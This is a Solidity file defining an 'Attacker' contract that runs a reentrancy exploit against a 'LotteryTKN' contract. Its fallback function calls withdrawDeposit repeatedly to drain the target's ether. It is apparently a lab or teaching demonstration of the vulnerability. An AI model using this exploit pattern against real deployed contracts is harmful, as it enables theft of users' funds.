// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./LotteryTKN.sol";

contract Attacker {
    LotteryTKN public lotteryTkn;

    constructor(address _lotteryTknAddress){
        lotteryTkn = LotteryTKN(_lotteryTknAddress);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);

        lotteryTkn.deposit{value: 1 ether}();
        lotteryTkn.withdrawDeposit(1 ether);
    }

    function getBalance() public returns(uint256) {
        return address(this).balance;
    }

    //receive() external payable {}

    fallback() external payable {
        if(address(lotteryTkn).balance >= 1 ether){
            lotteryTkn.withdrawDeposit(1 ether);
        }
    }
}